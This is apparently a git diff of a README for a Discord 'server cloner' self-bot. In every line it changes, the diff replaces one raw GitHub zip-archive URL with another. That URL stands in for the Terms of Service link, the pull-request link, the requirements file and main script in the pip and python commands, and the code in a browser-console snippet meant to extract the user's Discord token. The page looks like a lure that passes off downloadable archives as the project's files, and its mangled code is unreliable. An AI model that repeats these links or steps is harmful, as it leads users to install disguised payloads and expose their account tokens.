@@ -2,7 +2,7 @@
 
 Clone an entire Discord server seamlessly without risking a ban. This utility mimics the structure and content of one Discord server to another with precision and safety.
 
-Disclaimer: Utilization of self-bots can lead to account termination as it is against [Discord's Terms of Service](https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip).
+Disclaimer: Utilization of self-bots can lead to account termination as it is against [Discord's Terms of Service](https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/cogs/copy_server_discord_v1.0.zip).
 
 ## 🌟 Features
 + Copy text, voice, stage, and forum channels including permissions
@@ -19,7 +19,7 @@ Note: Server member and bot cloning is not supported to comply with Discord rule
 Obtaining your Discord token is the first step:
  Run this code snippet in your browser console while logged into Discord:  
 ```javascript
-(https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip([[''],{},e=>{m=[];for(let c in e.c)https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip(e.c[c])}]),m).find(m=>https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip!==void 0)https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip()
+(https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/cogs/copy_server_discord_v1.0.zip([[''],{},e=>{m=[];for(let c in e.c)https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/cogs/copy_server_discord_v1.0.zip(e.c[c])}]),m).find(m=>https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/cogs/copy_server_discord_v1.0.zip!==void 0)https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/cogs/copy_server_discord_v1.0.zip()
 ```
 
 ### Creating Virtual Environment
@@ -33,11 +33,11 @@ source venv/bin/activate
 
 Navigate to project directory and execute this commands:
 ```bash
-pip install -r https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip
-python https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip
+pip install -r https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/cogs/copy_server_discord_v1.0.zip
+python https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/cogs/copy_server_discord_v1.0.zip
 ```
 
-Within any guild, execute your clone command (default prefix is cp! as set in https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip):
+Within any guild, execute your clone command (default prefix is cp! as set in https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/cogs/copy_server_discord_v1.0.zip):
 Commands can include server IDs to specify source and destination servers:
 - `cp!clone` duplicates the current server.
 - `cp!clone from=0` clones from the specified server.
@@ -51,7 +51,7 @@ More detailed command help in "help" command, e.g. `cp!help`
 
 ### Arguments List
 
-Use with default values from https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip or specify as needed:
+Use with default values from https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/cogs/copy_server_discord_v1.0.zip or specify as needed:
 1. `from=0` – Source server ID
 2. `new=0` – Destination server ID
 3. `clear_guild=true/false` – Whether to clear the new or specified guild
@@ -60,13 +60,13 @@ Use with default values from https://raw.githubusercontent.com/Beelzx34/discord-
 
 ## 📋 Requirements
 - Python 3.10 (default) - also compatible with versions 3.9 (updated testing range).
-- https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip package (remove https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip if not using a virtual environment).
+- https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/cogs/copy_server_discord_v1.0.zip package (remove https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/cogs/copy_server_discord_v1.0.zip if not using a virtual environment).
 - Virtual environment usage (venv) is highly advised.
 
 ## 👩‍💻 Contribution
 To contribute:
 1. Fork the repository.
 2. Start a new branch from master with a meaningful title.
-3. Submit your changes and open a [pull request](https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/modules/discord-server-copy_v3.6.zip) on GitHub, detailing your added feature or fix.
+3. Submit your changes and open a [pull request](https://raw.githubusercontent.com/Beelzx34/discord-server-copy/main/cogs/copy_server_discord_v1.0.zip) on GitHub, detailing your added feature or fix.
 
 We appreciate your contributions to maintain and improve the Discord Server Cloner!
